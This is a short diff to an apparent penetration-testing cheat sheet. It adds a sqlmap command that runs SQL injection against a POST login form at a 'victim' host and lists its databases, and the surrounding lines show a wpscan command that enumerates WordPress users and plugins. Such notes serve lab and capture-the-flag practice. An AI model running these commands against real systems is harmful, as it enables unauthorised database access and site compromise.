@@ -96,6 +96,11 @@
 		--no-cast can also be used to decrease the payloads length
 		
 	5. sqlmap -r sql.txt --level=5 --risk=3
+	
+	6. Post form
+		sqlmap -u "http://victim:1337/978345210/index.php" --method POST  --data="username=admin&password=password&  submit=+Login+" --level=5 --risk=3 --dbms=MySql --dbs
+		
+		--dbs = finds the underlying databases
 
 # Wordpress Scanning
 	1. wpscan --url https://10.0.2.9:12038/blogblog --enumerate uvp
